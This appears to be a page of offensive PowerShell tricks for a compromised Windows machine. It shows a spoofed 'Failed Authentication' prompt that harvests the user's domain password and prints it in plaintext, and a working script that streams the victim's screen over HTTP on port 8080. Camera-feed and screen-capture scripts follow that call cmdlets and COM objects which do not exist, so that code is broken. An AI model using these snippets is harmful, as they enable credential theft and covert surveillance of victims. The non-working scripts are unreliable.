# Bonus Tricks

### Keylogger prompt

This is a neat trick that can be used during desperate times. It will spawn a UI prompt that will ask for the user's domain credentials using environment variables to pull the username, then display the password in plaintext to the attacker console. 

From a CMD.exe prompt:

```powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

- from Sektor7 Privilege Escalation course

### Serving Display on HTTP

This script captures the content of the primary screen, converts it to a JPEG image, and serves it over an HTTP web server on port 8080. The script will continuously update the image and serve it as long as the HTTP listener is running.

```
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://0.0.0.0:8080/")
$listener.Start()

Write-Host "Streaming server is running on http://0.0.0.0:8080/"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $response = $context.Response

    $stream = $response.OutputStream
    $imageStream = New-Object System.IO.MemoryStream

    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)

    $bitmap.Save($imageStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)

    $response.ContentType = "image/jpeg"
    $response.ContentLength64 = $imageStream.Length

    $imageStream.WriteTo($stream)

    $imageStream.Dispose()
    $stream.Dispose()
}

$listener.Stop()

```

`Install-Module -Name WebAdministration`

```
# Import the Windows PowerShell Web Server module
Import-Module WebAdministration

# Define the path to your screen capture files
$screenCapturePath = "C:\Path\To\Screen\Capture"

# Start the screen capture
$job = Start-Process powershell.exe "-command & { Get-ChildItem -Path C:\Path\To\Screen\Capture -Filter '*.jpg' -Recurse | Remove-Item }" -PassThru
$job2 = Start-ScreenCapture -Path $screenCapturePath

# Set up the web server to serve the screen capture
New-WebVirtualDirectory -Site 'Default Web Site' -Name 'ScreenCapture' -PhysicalPath $screenCapturePath
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "enabled" -Value "True"
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "showFlags" -Value "Date, Time, Size, Extension"

# Set the web server to listen on port 8080
Set-ItemProperty -Path "IIS:\Sites\Default Web Site" -Name bindings -Value @{protocol="http";bindingInformation="*:8080:"}

```


## Serving Camera Feed on HTTP

This script does the following:

Imports the Windows PowerShell Web Server module.
Defines the path to your camera feed.
Starts the camera feed using the Windows Media Foundation APIs.
Sets up a virtual directory in the default web site that serves the camera feed.
Enables directory browsing and sets the directory browse flags.
Sets the web server to listen on port 8080.

```
# Import the Windows PowerShell Web Server module
Import-Module WebAdministration

# Define the path to your camera feed
$cameraFeedPath = "C:\Path\To\Camera\Feed"

# Start the camera feed
$mediaSource = New-Object -ComObject 'MFMediaSource'
$mediaSource.OpenDevice("Video", "Integrated Webcam", $null, [System.Guid]::Empty)

# Set up the web server to serve the camera feed
New-WebVirtualDirectory -Site 'Default Web Site' -Name 'CameraFeed' -PhysicalPath $cameraFeedPath
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "enabled" -Value "True"
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "showFlags" -Value "Date, Time, Size, Extension"

# Set the web server to listen on port 8080
Set-ItemProperty -Path "IIS:\Sites\Default Web Site" -Name bindings -Value @{protocol="http";bindingInformation="*:8080:"}

```
